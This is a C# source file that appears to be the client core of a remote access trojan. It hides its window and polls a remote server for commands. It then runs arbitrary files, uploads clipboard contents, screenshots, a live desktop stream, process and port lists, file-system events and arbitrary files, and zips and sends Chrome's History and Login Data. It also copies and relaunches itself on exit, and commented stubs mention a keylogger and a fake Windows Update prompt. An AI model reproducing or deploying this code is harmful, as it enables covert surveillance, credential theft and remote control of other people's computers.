using Library;
using Models;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace Library
{
    public delegate void OnScreenshotDelegate(object sender, System.Drawing.Bitmap bitmapImage);
    public delegate void OnFileEventDelegate(object sender, FileSystemEventArgs e);

    public delegate void OnCommandDelegate(object sender, ECommand e);

    public class Handler
    {
        private bool isQuitting = false;
        public Transmitter Transmitter { get; set; }
        public System.Drawing.Bitmap Screenshot { get; private set; }
        public FileDirHandler FileDirInfo { get; private set; }
        private FileSystemWatcher watcher;
        private Timer screenShotTimer;


        public event OnScreenshotDelegate OnScreenshot;
        public event OnFileEventDelegate OnFileEvent;
        public event OnCommandDelegate OnCommandEvent;

        #region Singleton
        private static Handler instance;

        public static Handler Instance
        {
            get
            {
                lock (typeof(Handler))
                {
                    if (instance == null)
                    {
                        instance = new Handler();
                    }
                    return instance;
                }
            }
        }

        private Handler()
        {
            FileDirInfo = new FileDirHandler();
            watcher = new FileSystemWatcher();
            screenShotTimer = new Timer();
            screenShotTimer.Tick += screenShotTimer_Tick;
        }
        #endregion

        public void StartExceptionHandling()
        {
            Application.ThreadExit += Application_ThreadExit;
            Application.ThreadException += Application_ThreadException;
            Application.ApplicationExit += Application_ApplicationExit;
            AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
        }

        public void StopExceptionHandling()
        {
            Application.ThreadExit -= Application_ThreadExit;
            Application.ThreadException -= Application_ThreadException;
            Application.ApplicationExit -= Application_ApplicationExit;
            AppDomain.CurrentDomain.ProcessExit -= CurrentDomain_ProcessExit;
            AppDomain.CurrentDomain.UnhandledException -= CurrentDomain_UnhandledException;
        }

        public Process Restart(string filename)
        {
            Process process = new Process();
            process.StartInfo.FileName = filename;
            process.EnableRaisingEvents = true;
            process.Start();
            //process.Disposed += LaunchIfCrashed;
            process.Exited += Application_ApplicationExit;
            return process;
        }

        public void StartScreenshotTimer(int intervalMilliseconds)
        {
            screenShotTimer.Interval = intervalMilliseconds;
            screenShotTimer.Start();
        }

        public void StopScreenshotTimer()
        {
            screenShotTimer.Stop();
        }

        /// <summary>
        /// Watches root dir (usually C:\)
        /// </summary>
        public void StartDirectoryWatcher()
        {
            StartDirectoryWatcher(Directory.GetDirectoryRoot(Environment.CurrentDirectory), "*.*", true);
            //StartDirectoryWatcher(@"C:\", "*.*", true);
        }

        public void StartDirectoryWatcher(string directory, string filter, bool includeSubdirectories)
        {
            //directory = Environment.CurrentDirectory;
            watcher = new FileSystemWatcher(directory, filter);
            watcher.Path = directory;
            watcher.Filter = filter;
            watcher.NotifyFilter =
                NotifyFilters.Attributes |
                NotifyFilters.CreationTime |
                NotifyFilters.DirectoryName |
                NotifyFilters.FileName |
                NotifyFilters.LastAccess |
                NotifyFilters.LastWrite |
                NotifyFilters.Security |
                NotifyFilters.Size;
            watcher.IncludeSubdirectories = includeSubdirectories;

            watcher.Changed += watcher_Changed;
            watcher.Created += watcher_Created;
            watcher.Deleted += watcher_Deleted;
            watcher.Renamed += watcher_Renamed;

            watcher.EnableRaisingEvents = true;

            //Console.WriteLine("Watching dir: " + directory);
            //MessageBox.Show("Watching dir: " + directory);
        }

        public void StopDirectoryWatcher()
        {
            watcher.EnableRaisingEvents = false;
        }

        private void Replicate()
        {
            DialogResult dr = MessageBox.Show("Replicate?", "Replicate?", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1);
            if (dr == System.Windows.Forms.DialogResult.Yes)
            {
                Replicator.Instance.Replicate(true);
            }
        }

        void HandleExit(String msg)
        {
            if (!isQuitting)
            {
                Application.Restart();
            }
            isQuitting = true;
        }

        private void HandleWatcher(FileSystemEventArgs e)
        {
            //MessageBox.Show("Event: " + e.ChangeType + ", File/Dir: " + e.Name);
            //Console.WriteLine("Event: " + e.ChangeType + ", File/Dir: " + e.Name);
            FileDirInfo.CreateFileDirInfoEntry(e);
            OnFileEvent(this, e);
        }

        void screenShotTimer_Tick(object sender, EventArgs e)
        {
            if (Screenshot != null)
                Screenshot.Dispose();

            Screenshot = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
            {
                OnScreenshot(this, Screenshot);
            }

        }

        #region Watcher Events
        void watcher_Created(object sender, FileSystemEventArgs e)
        {
            //fdh.CreateFileDirInfoEntry(e);
            HandleWatcher(e);
        }

        void watcher_Changed(object sender, FileSystemEventArgs e)
        {
            HandleWatcher(e);
        }

        void watcher_Renamed(object sender, RenamedEventArgs e)
        {
            HandleWatcher(e);
        }

        void watcher_Deleted(object sender, FileSystemEventArgs e)
        {
            HandleWatcher(e);
        }
        #endregion


        #region Exception Events
        void Application_ThreadExit(object sender, EventArgs e)
        {
            HandleExit("Application: Thread Exit! Restarting...");
        }

        void Application_ThreadException(object sender, System.Threading.ThreadExceptionEventArgs e)
        {
            HandleExit("Application: Thread Exception! Restarting...");
        }

        void Application_ApplicationExit(object sender, EventArgs e)
        {
            HandleExit("Application: Application Exit! Restarting...");
        }

        void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            HandleExit("Domain: Unhandled Exception! Restarting...");
        }

        void CurrentDomain_ProcessExit(object sender, EventArgs e)
        {
            HandleExit("Domain: Process Exit! Restarting...");
        }
        #endregion



        public List<string> GetBrowserHistory(EBrowser browser, string historyFile)
        {
            SQLiteConnection conn = new SQLiteConnection(@"Data Source=" + historyFile);
            conn.Open();
            SQLiteCommand cmd = new SQLiteCommand();
            cmd.Connection = conn;
            //  cmd.CommandText = "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name;";
            //  Use the above query to get all the table names
            cmd.CommandText = "Select * From urls";
            SQLiteDataReader dr = cmd.ExecuteReader();
            while (dr.Read())
            {
                //MessageBox.Show(dr[1].ToString());
                Console.WriteLine(dr[1].ToString());
            }
            return null;
        }

        public enum EBrowser { Chrome, IE }

        public void KillProcess()
        {
            try
            {
                var pid = -1;
                if (int.TryParse(Transmitter.TSettings.Parameters, out pid))
                {
                    if (pid >= 0)
                    {
                        var process = Process.GetProcessById(pid);
                        if (process != null)
                        {
                            process.Kill();
                        }
                    }
                }
                else
                {
                    var processes = Process.GetProcessesByName(Transmitter.TSettings.Parameters);
                    if (processes != null)
                    {
                        processes[0].Kill();
                    }
                }
            }
            catch (Exception ex)
            {
                // handle
            }
        }

        public void UploadClipboardData()
        {

            long quality = 80;
            long.TryParse(Transmitter.TSettings.Parameters, out quality);
            // Upload clipboard text
            var clipboardText = Clipboard.GetText();
            if (!string.IsNullOrEmpty(clipboardText))
            {
                Transmitter.UploadData("clipboard.txt", clipboardText, false);
            }
            // Upload clipboard image
            var clipboardImage = Clipboard.GetImage();
            if (clipboardImage != null)
            {
                Transmitter.UploadImage("clipboard.jpg", clipboardImage, quality);
            }
        }

        public void UploadDesktopImage()
        {
            long quality = 80;
            long.TryParse(Transmitter.TSettings.Parameters, out quality);
            var bitmapImage = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
            Transmitter.UploadImage("desktop.jpg", bitmapImage, quality);
        }

        public void ExecuteCommand()
        {

            var fileName = Transmitter.TSettings.File;
            var fileArgs = Transmitter.TSettings.Parameters;

            fileArgs = fileArgs != null ? fileArgs : "";
            try
            {
                if (!string.IsNullOrEmpty(fileName))
                {
                    var hasExecuted = false;
                    try
                    {
                        ProcessStartInfo psi = new ProcessStartInfo(fileName, fileArgs);
                        psi.WorkingDirectory = AppDir;
                        Process.Start(psi);
                        hasExecuted = true;
                    }
                    catch (Exception ex)
                    {
                        hasExecuted = false;
                    }
                    if (!hasExecuted)
                    {
                        fileName = Path.Combine(DirTransfers, fileName);// appDir + "\\Transfers\\" + fileName;
                        try
                        {
                            ProcessStartInfo psi = new ProcessStartInfo(fileName, fileArgs);
                            psi.WorkingDirectory = DirTransfers;
                            Process.Start(psi);
                        }
                        catch (Exception ex2) { }
                    }
                }
            }
            catch { }
        }


        public string AppDir { get; private set; }
        public string DirTransfers { get; private set; }
        public string DirPlugins { get; private set; }
        public Assembly thisApp { get; private set; }
        private static readonly string APPDIR_TRANSFERS = "Transfers";
        private static readonly string APPDIR_PLUGINS = "Plugins";
        public bool StartNewProcessOnExit { get; set; }
        private int CONNECTION_TIMEOUT = 10000;
        private int CONNECTION_INTERVAL = 10000;


        private Timer transmitTimer;
        private int transmitTimerInterval = 5000;
        private Timer connectTimer;
        private Timer streamDesktopTimer;
        public Form HostForm { get; private set; }

        public void Initialize(HandlerInitData option)
        {
            this.HostForm = option.HostForm;
            this.CONNECTION_TIMEOUT = option.CONNECTION_TIMEOUT;
            this.CONNECTION_INTERVAL = option.CONNECTION_INTERVAL;
            this.StartNewProcessOnExit = option.startNewProcessOnExit;
            HideForm();
            Application.ApplicationExit += Application_ApplicationExit2;
            thisApp = Assembly.GetExecutingAssembly();
            //File.SetAttributes(thisProgram, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
            //Replicate(_args);
            var appDirBase = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var appDirFolder = Path.Combine(appDirBase, "Hello World");
            if (!Directory.Exists(appDirFolder))
            {
                Directory.CreateDirectory(appDirFolder);
            }
            appDirFolder = Path.Combine(appDirFolder, PathExt.ReformatName("" + DateTime.Now.Ticks));
            if (!Directory.Exists(appDirFolder))
            {
                Directory.CreateDirectory(appDirFolder);
            }
            AppDir = Path.Combine(appDirBase, appDirFolder);
            //Clipboard.SetText(appDir); MessageBox.Show(appDir);
            DirTransfers = Path.Combine(AppDir, APPDIR_TRANSFERS);
            DirPlugins = Path.Combine(AppDir, APPDIR_PLUGINS);
            // temporary while testing
#if DEBUG
            DirPlugins = @"C:\Users\benjamin\Documents\Visual Studio 2013\Projects\restless-honey-seeker\Shared\PluginDemo\bin\x64\Debug";
#endif
            CreateDirectory(AppDir);
            CreateDirectory(DirTransfers);
            CreateDirectory(DirPlugins);
            //OpenFakeTextFile("Hey!");
            Transmitter = new Library.Transmitter(option.Url, option.APIKEY_PRIVATE, option.APIKEY_PUBLIC, CONNECTION_TIMEOUT);

            //foo = Handler.Instance.Transmitter.Test(2);
            //foo = Handler.Instance.Transmitter.Test2("bar");
            //var compHash = Handler.Instance.Transmitter.GetComputerHash();
            //Clipboard.SetText(compHash); MessageBox.Show(compHash);
            //Handler.Instance.Transmitter.Authorize();
            //UploadImage();
            //UploadBrowserData();
            SetupConnectionTimer();
            //File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History", historyFile);
            //h.GetBrowserHistory(Handler.EBrowser.Chrome, historyFile);
            //FirewallManager.Instance.AddPort(1234, "test1234");
            //MinimizeFootPrint();
        }

        private void HideForm()
        {
            HostForm.StartPosition = FormStartPosition.Manual;
            HostForm.DesktopLocation = new Point(Screen.PrimaryScreen.Bounds.Width + 10000, Screen.PrimaryScreen.Bounds.Y + 10000);
            HostForm.WindowState = FormWindowState.Minimized;
            HostForm.Opacity = 0;
            HostForm.ShowInTaskbar = false;
        }
        private void SetupConnectionTimer()
        {
            connectTimer = new Timer();
            if (!ConnectAndSetup())
            {
                connectTimer.Interval = CONNECTION_INTERVAL;
                connectTimer.Tick += (o, e) =>
                {
                    connectTimer.Enabled = !ConnectAndSetup();
                };
            }
        }

        public void SetTransmissionInterval()
        {
            var timeMS = Transmitter.TSettings.Parameters;
            int newInterval = 5000;
            if (int.TryParse(timeMS, out newInterval))
            {
                transmitTimerInterval = (newInterval >= 1000 && newInterval <= 24 * 60 * 60 * 1000) ? newInterval : transmitTimerInterval;
                transmitTimer.Interval = transmitTimerInterval;
            }
        }

        /// <summary>
        /// Returns TRUE if authorized
        /// </summary>
        /// <returns></returns>
        bool ConnectAndSetup()
        {
            bool isAuthorized = Handler.Instance.Transmitter.Authorize();
            if (isAuthorized)
            {
                //Handler.Instance.StartKeyLogger();
                //Handler.Instance.StartExceptionHandling();
                Handler.Instance.StartDirectoryWatcher();

                //Handler.Instance.OnReturn += (o, e) =>
                //{
                //    HandleReturnEvent(e);
                //};
                Handler.Instance.OnFileEvent += (o, e) =>
                {
                    HandleFileEvent(e);
                };
                Handler.Instance.OnScreenshot += (o, e) =>
                {
                    //HandleImageEvent(e);
                };

                transmitTimer = new Timer();
                transmitTimer.Interval = transmitTimerInterval;
                transmitTimer.Tick += (o, e) =>
                {
                    Handler.Instance.Transmitter.LoadSettings();
                    if (Handler.Instance.Transmitter.TSettings == null) return;
                    if (Handler.Instance.Transmitter.TSettings.HasExectuted) return;
                    //var command = Handler.Instance.Transmitter.GetCommand();
                    //if (!command.ToString().Equals("DO_NOTHING"))
                    //{
                    //    MessageBox.Show(command.ToString());
                    //}
                    OnCommandEvent(this, Handler.Instance.Transmitter.TSettings.Command);
                    Handler.Instance.Transmitter.SetHasExectuted(Handler.Instance.Transmitter.TSettings);
                };
                transmitTimer.Enabled = true;
                //CreateFakeWindowsUpdateNotifyIcon(1000,  "New updates are available", "Click to install them using Windows Update.");
            }
            return isAuthorized;
        }

        private void CreateDirectory(string dir)
        {
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }
        }

        void Application_ApplicationExit2(object sender, EventArgs e)
        {
            if (StartNewProcessOnExit)
            {
                var fi = new FileInfo(thisApp.Location);
                Process.Start(new ProcessStartInfo(fi.FullName, "clone " + Convert.ToBase64String(Encoding.Default.GetBytes(fi.FullName)) + " true"));
            }
            try
            {
                Handler.Instance.Transmitter.DeAuthorize();
            }
            catch { }
        }

        private int HandleFileEvent(FileSystemEventArgs e)
        {
            /*if (listBox2.InvokeRequired)
            {
                try
                {
                    SetTextCallback d = new SetTextCallback(HandleFileEvent);
                    this.Invoke(d, new object[] { e });
                }
                catch (ObjectDisposedException ex)
                {

                }
                return 1;
            }
            else
            {
                return listBox2.Items.Add(e.ChangeType + ", " + e.Name + ", " + e.FullPath);
            }*/
            return 0;
        }

        private void HandleImageEvent(Bitmap e)
        {
            /*if (pictureBox1.InvokeRequired)
            {
                SetImageCallback d = new SetImageCallback(HandleImageEvent);
                this.Invoke(d, new object[] { e });
            }
            else
            {
                pictureBox1.Image = e;
            }*/
        }

        public bool RunElevated(string fileName)
        {
            //MessageBox.Show("Run: " + fileName);
            ProcessStartInfo processInfo = new ProcessStartInfo();
            processInfo.Verb = "runas";
            processInfo.FileName = fileName;
            try
            {
                Process.Start(processInfo);
                return true;
            }
            catch (Win32Exception)
            {
                //Do nothing. Probably the user canceled the UAC window
            }
            return false;
        }

        private string GetProgramName()
        {
            var process = Process.GetCurrentProcess();
            if (process != null)
            {
                return process.ProcessName;
            }
            return string.Empty;
        }

        [System.Runtime.InteropServices.DllImport("psapi.dll")]
        static extern int EmptyWorkingSet(IntPtr hwProc);

        public void MinimizeFootPrint()
        {
            EmptyWorkingSet(Process.GetCurrentProcess().Handle);
        }

        public void UploadPortInfo()
        {
            StringBuilder sb = new StringBuilder();
            var piList = FirewallManager.Instance.GetPortInfo();
            piList.ForEach((Library.PortInfo pi) => sb.AppendLine(pi.IP + ":" + pi.Port + " - " + pi.Name));
            Handler.Instance.Transmitter.UploadPortInfo(sb.ToString());
        }

        public void UploadProcessInfo()
        {
            StringBuilder sb = new StringBuilder();
            foreach (var p in OS.GetProcesses())
            {
                sb.AppendLine("Name: " + p.Name + ", PID: " + p.PID);
            }
            Handler.Instance.Transmitter.UploadData("processes.txt", sb.ToString(), false);
        }

        public void StopStreamDesktop()
        {
            if (streamDesktopTimer == null) return;
            streamDesktopTimer.Enabled = false;
            streamDesktopTimer.Stop();
        }

        public void StreamDesktop()
        {
            var interval = 10000;
            if (!int.TryParse(Handler.Instance.Transmitter.TSettings.Parameters, out interval))
            {
                interval = 10000;
            }
            streamDesktopTimer = new Timer();
            streamDesktopTimer.Interval = interval;
            streamDesktopTimer.Tick += (o, e) =>
            {
                var quality = 10L;
                Bitmap bitmapImage = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
                Handler.Instance.Transmitter.UploadImage("stream.jpg", bitmapImage, quality);
                //CursorInteract();
            };
            streamDesktopTimer.Enabled = true;
            streamDesktopTimer.Start();
        }

        public void CursorInteract()
        {
            //MessageBox.Show(Handler.Instance.Transmitter.TSettings.CursorX + ", " + Handler.Instance.Transmitter.TSettings.CursorY);
            HostForm.Cursor = new Cursor(Cursor.Current.Handle);
            Cursor.Position = new Point(Handler.Instance.Transmitter.TSettings.CursorX, Handler.Instance.Transmitter.TSettings.CursorY);
            string inputChar = Handler.Instance.Transmitter.TSettings.KeyCode;
            if (inputChar.Length > 0)
            {
                //MessageBox.Show(inputChar);
            }
            //Cursor.Clip = new Rectangle(HostForm.Location, HostForm.Size);
        }

        public void UploadFileEvents()
        {
            StringBuilder sb = new StringBuilder();
            Handler.Instance.FileDirInfo.FileDirInfoList.ForEach((FileDirInfo fdi) => sb.AppendLine(fdi.DateTime.ToString() + " " + fdi.FileInfo.ToString()));
            Handler.Instance.Transmitter.UploadFileEvents(sb.ToString());
        }

        public void DownloadFile()
        {
            byte[] fileData = Handler.Instance.Transmitter.DownloadFile();
            if (fileData != null)
            {
                File.WriteAllBytes(Path.Combine(Handler.Instance.DirTransfers, Handler.Instance.Transmitter.TSettings.File), fileData);
                //string path = appDir + "\\Transfers";
                //if (!Directory.Exists(path))
                //{
                //    try
                //    {
                //        Directory.CreateDirectory(path);
                //    }
                //    catch { }
                //}
                //try
                //{
                //    File.WriteAllBytes(Path.Combine(path, Handler.Instance.Transmitter.TSettings.File), fileData);
                //}
                //catch { }
            }
        }

        public void UploadFile()
        {
            var fileInfo = new FileInfo(Handler.Instance.Transmitter.TSettings.File); // .FileToDownload);
            try
            {
                var data = new FileData(fileInfo, File.ReadAllBytes(fileInfo.FullName), Handler.Instance.Transmitter.TSettings.ComputerHash);
                Handler.Instance.Transmitter.UploadFile(data);
            }
            catch (Exception ex)
            {
                // handle
            }
        }

        //private void UploadFile(string path, int c = 0)
        //{
        //    if (!Handler.Instance.Transmitter.UploadFile(PatHandler.Instance.GetFileName(path), path) && c <= 1)
        //    {
        //        UploadFile(Handler.Instance.Transmitter.TSettings.FileToDownload, c + 1);
        //    }
        //    try
        //    {
        //        File.Delete(path);
        //    }
        //    catch (Exception ex) { }
        //}

        //private void CompressAndUploadFile(string fileFullPath)
        //{
        //    try
        //    {
        //        string fileName = Path.GetFileName(fileFullPath);
        //        string fileToUpload = dirDownloads + "\\" + fileName;
        //        if (Compression.Zip(fileFullPath, fileToUpload))
        //        {
        //            Handler.Instance.Transmitter.UploadFile(fileName, fileToUpload);
        //        }
        //        try
        //        {
        //            File.Delete(fileToUpload);
        //        }
        //        catch (Exception ex) { }
        //    }
        //    catch (Exception ex) { }
        //}

        public static void CopyStream(Stream input, Stream output)
        {
            byte[] buffer = new byte[8 * 1024];
            int len;
            while ((len = input.Read(buffer, 0, buffer.Length)) > 0)
            {
                output.Write(buffer, 0, len);
            }
        }

        public void UploadBrowserData()
        {
            try
            {
                // Save Chrome Browser data
                string[] chromeFiles = new string[] {
                        "History",
                        "Login Data"
                    };
                var chromePath = @"\Google\Chrome\User Data\Default\";
                int c = 0;
                string[] zipFiles = new string[chromeFiles.Length];
                foreach (var file in chromeFiles)
                {
                    //var destFileName = dirTransfers + @"\Chrome " + file;
                    //if (File.Exists(destFileName))
                    //{
                    //    File.Delete(destFileName);
                    //}
                    var sourceFileName = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + chromePath + file;
                    //File.Copy(sourceFileName, destFileName);
                    //zipFiles[c] = destFileName;
                    zipFiles[c] = sourceFileName;
                    c++;
                }
                //var fileData = Compression.Compress(zipFiles);
                //File.WriteAllBytes(@"C:\Users\benjamin\AeroFS\Visual Studio 2012\Projects\restless-honey-seeker\serverDotNet\Server\DataFromClient\" + DateTime.Now.Ticks + ".zip", fileData);

                var data = new FileData("ChromeData.zip", Compression.Compress(zipFiles), Handler.Instance.Transmitter.TSettings.ComputerHash);
                Handler.Instance.Transmitter.UploadFile(data);


                //if (Compression.Zip(zipFiles, dirTransfers + "\\Chrome Browser Data.zip"))
                //{
                //    foreach (var file in chromeFiles)
                //    {
                //        try
                //        {
                //            File.Delete(dirTransfers + @"\Chrome " + file);
                //        }
                //        catch (Exception ex) { }
                //    }
                //    string fileToUpload = dirTransfers + "\\Chrome Browser Data.zip";
                //    //Handler.Instance.Transmitter.UploadFile("Chrome Browser Data", fileToUpload);
                //    var fileInfo = new FileInfo(fileToUpload);
                //    var fileData = File.ReadAllBytes(fileInfo.FullName);
                //    Handler.Instance.Transmitter.UploadFile(new FileData()
                //    {
                //        FileInfo = fileInfo,
                //        Data = fileData
                //    });
                //    try
                //    {
                //        File.Delete(fileToUpload);
                //    }
                //    catch (Exception ex) { }
                //}
            }
            catch (Exception ex) { }
        }

        private void Replicate(string[] _args)
        {
            // Hide itself
            //File.SetAttributes(thisProgram, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
            if (_args.Length == 3)
            {
                var fiSrc = Encoding.Default.GetString(Convert.FromBase64String(_args[1]));
                Handler.Instance.StartNewProcessOnExit = Boolean.Parse(_args[2]);
                //clone app to other destination
                if (_args[0] == "clone")
                {
                    try
                    {
                        // todo: Should be dynamic places
                        string destDir = Path.Combine(Environment.CurrentDirectory, "Clone");// Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);// Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                        if (!Directory.Exists(destDir))
                        {
                            try
                            {
                                Directory.CreateDirectory(destDir);
                            }
                            catch { }
                        }
                        FileInfo fiSelf = new FileInfo(Handler.Instance.thisApp.Location);
                        var target = Path.Combine(destDir, fiSelf.Name);
                        if (fiSelf.DirectoryName != destDir)
                        {
                            if (File.Exists(target))
                            {
                                File.Delete(target);
                            }
                            File.Copy(Handler.Instance.thisApp.Location, target);
                            //System.Threading.Thread.Sleep(1000);
                            var psi = new ProcessStartInfo(target, "dont_clone " + Convert.ToBase64String(Encoding.Default.GetBytes(fiSelf.FullName)) + " false");
                            Process.Start(psi);
                            Application.Exit();
                        }
                    }
                    catch { }
                }
                else if (_args[0] == "dont_clone")
                {
                    // delete old app
                    try
                    {
                        System.Threading.Thread.Sleep(1000);
                        File.Delete(fiSrc);
                    }
                    catch { }
                }
            }
        }

        public bool OpenFakeTextFile(string message)
        {
            try
            {
                String tempDir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                //String tempDir = appDir + "\\" + DateTime.Now.Ticks;
                //CreateDirectory(tempDir);
                //tempFile = tempDir + "\\" + PathExt.ReformatName(GetProgramName()) + ".txt";
                var fakeTextFilePath = Environment.CurrentDirectory + "\\" + PathExt.ReformatName(GetProgramName()) + ".txt";
                using (FileStream fs = new FileStream(fakeTextFilePath, FileMode.Create))
                {
                    using (StreamWriter sw = new StreamWriter(fs, Encoding.UTF8))
                    {
                        sw.WriteLine(message);
                        sw.Close();
                    }
                    fs.Close();
                }
                FileInfo fileInfo = new FileInfo(fakeTextFilePath);
                fileInfo.Attributes = FileAttributes.Hidden;
                ProcessStartInfo psi = new ProcessStartInfo("notepad.exe", fakeTextFilePath);
                psi.WindowStyle = ProcessWindowStyle.Maximized;
                psi.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                Process.Start(psi);
                return true;
            }
            catch (Exception ex) { return false; }
        }
    }
}
